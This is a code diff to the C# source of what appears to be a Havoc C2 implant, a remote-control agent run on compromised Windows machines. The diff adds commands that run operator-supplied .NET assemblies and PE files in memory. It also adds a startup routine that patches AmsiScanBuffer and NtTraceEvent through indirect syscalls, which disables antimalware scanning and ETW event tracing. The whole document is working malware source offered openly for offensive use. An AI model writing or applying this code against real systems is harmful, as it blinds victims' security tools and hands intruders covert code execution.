@@ -2,6 +2,7 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
+using System.Runtime.InteropServices;
 using System.Threading.Tasks;
 using System.Net.Http;
 using System.Net;
@@ -15,6 +16,7 @@ using System.Security.Cryptography;
 using System.Management;
 using HavocImplant.AgentFunctions.BofExec;
 using HavocImplant.AgentFunctions.BofExec.Internals;
+using HavocImplant.NativeUtils;
 using static HavocImplant.Implant;
 
 namespace HavocImplant
@@ -58,6 +60,8 @@ namespace HavocImplant
         string processName = Process.GetCurrentProcess().ProcessName;
         string osVersion = HKLM_GetString(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion", "ProductName");
 
+        // Locking resource related stuff
+        static readonly object pe_lock = new object();
         static void Main(string[] args) // Looping through tasks and stuff
         {
             Implant implant = new Implant();
@@ -68,6 +72,8 @@ namespace HavocImplant
 
             Console.WriteLine($"Implant will disconnect after {implant.maxTries} fails");
             Console.WriteLine($"Implant will consider {implant.timeout / 1000} as the timeout");
+
+            RunPatches();
 
             while (true)
             {
@@ -139,10 +145,38 @@ namespace HavocImplant
                                 downloadThread.Start();
                                 break;
                             case "bofexec":
+                                /*
+                                List<string> bofArgs = command.Substring(7).Trim().Split(';').ToList<string>();
+                                List<string> bof = new List<string>();
+                                if (bofArgs.Count > 2)
+                                {
+                                    bof.Add(bofArgs[bofArgs.Count-1]);
+                                    bofArgs.RemoveAt(bofArgs.Count-1);
+                                }
+                                
+                                Console.WriteLine($"bofArgs count: {bofArgs.Count}");
+                                for (int ii = 0; ii < bofArgs.Count; ii++)
+                                {
+                                    Console.WriteLine($"Arg {ii} is: {bofArgs[ii]}");
+                                }
+                                */
                                 string[] bofArgs = new string[] { command.Substring(7).Trim() };
-                                Thread bofExecthread = new Thread(() => AgentFunctions.BofExec.BofExec.Run(implant, bofArgs, taskId));
-                                bofExecthread.Start();
+                                Thread bofExecThread = new Thread(() => AgentFunctions.BofExec.BofExec.Run(implant, bofArgs, taskId));
+                                bofExecThread.Start();
                                 break;
+                                
+                            case "inline_assembly":
+                                Thread inlineAssemblyThread = new Thread(() => AgentFunctions.InlineAssembly.Run(implant, command.Substring(15).Trim(), taskId));
+                                inlineAssemblyThread.Start();
+                                break;
+                                
+                            case "inline_pe":
+                                lock (pe_lock)
+                                {
+                                    Thread inlinePEThread = new Thread(() => AgentFunctions.InlinePE.Run(implant, command.Substring(9).Trim(), taskId));
+                                    inlinePEThread.Start();
+                                    break;
+                                }
                         }
                     }
                 }
@@ -156,8 +190,8 @@ namespace HavocImplant
                     {
                         Console.WriteLine($"Shipping off Task ID {taskId}");
                         cumalativeOutput += implant.taskingInformation[taskId].taskOutput + "\n";
+                        implant.taskingInformation.Remove(taskId);
                     }
-                    implant.taskingInformation.Remove(taskId);
                     i--;
                 }
                 implant.CheckIn(cumalativeOutput, "commandoutput");
@@ -320,12 +354,37 @@ namespace HavocImplant
             return "";
 
         }
-
         public static string HKLM_GetString(string path, string key)
         {
             RegistryKey rk = Registry.LocalMachine.OpenSubKey(path);
             if (rk == null) return "";
             return (string)rk.GetValue(key);
+        }
+        public static void RunPatches()
+        {
+            // Amsi
+            byte[] patch = new byte[6];
+            patch[0] = 0xB8;
+            patch[1] = 0x57;
+            patch[2] = 0x00;
+            patch[3] = 0x07;
+            patch[4] = 0x80;
+            patch[5] = 0xc3;
+            IntPtr pAmsi = (IntPtr)globalDll.kernel32.dynamicExecute<Delegates.LoadLibraryA>("LoadLibraryA", new object[] {"amsi.dll"});
+            Console.WriteLine("Amsi at 0x{0:X}", pAmsi);
+            dll amsi = new dll("amsi.dll");
+            IntPtr pAmsiScanBuffer = amsi.dictOfExports["AmsiScanBuffer"];
+            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pAmsiScanBuffer, (IntPtr)patch.Length, (uint)Structs.Win32.Enums.PAGE_READWRITE, (uint)0 });
+            GCHandle hPatch = GCHandle.Alloc(patch, GCHandleType.Pinned);
+            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtWriteVirtualMemory>("NtWriteVirtualMemory",  new object[] { (IntPtr)(-1), pAmsiScanBuffer, hPatch.AddrOfPinnedObject(), (uint)patch.Length, (uint)0});
+            hPatch.Free();
+            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pAmsiScanBuffer, (IntPtr)patch.Length, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READ, (uint)0 });
+            // ETW
+            IntPtr pNtTraceEvent = IntPtr.Add(globalDll.ntdll.dictOfExports["NtTraceEvent"], 3);
+            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pNtTraceEvent, (IntPtr)1, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READWRITE, (uint)0 });
+            Marshal.WriteByte(pNtTraceEvent, 0xc3);
+            globalDll.ntdll.indirectSyscallInvoke<Delegates.NtProtectVirtualMemory>("NtProtectVirtualMemory", new object[] {(IntPtr)(-1), pNtTraceEvent, (IntPtr)1, (uint)Structs.Win32.Enums.PAGE_EXECUTE_READ, (uint)0 });
+            
         }
     }
 }
